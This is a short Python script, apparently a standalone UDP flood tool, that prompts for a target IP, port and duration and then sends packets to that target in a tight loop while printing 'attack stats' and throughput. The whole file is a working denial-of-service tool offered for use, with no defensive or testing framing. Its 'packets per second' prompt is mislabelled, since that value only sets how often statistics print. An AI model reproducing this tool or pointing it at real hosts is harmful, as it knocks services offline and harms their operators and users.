import socket
import time

def attack(ip, port, duration, package_count):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    start_time = time.time()
    end_time = start_time + duration

    i = 0
    while True:
        if time.time() > end_time:
            break
        sock.sendto(b'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', (ip, port))
        i += 1
        if i % package_count == 0:
            statistics(start_time, time.time(), i)

def statistics(start_time, end_time, package_count):
    duration = end_time - start_time
    throughput = package_count / duration
    print(f"Attack stats:")
    print(f"  Duration: {duration} seconds")
    print(f"  Throughput: {throughput} packets per second")

ip = input("Enter target IP: ")
port = int(input("Enter target port: "))
duration = float(input("Enter attack duration (seconds): "))
package_count = int(input("Enter packets per second: "))

attack(ip, port, duration, package_count)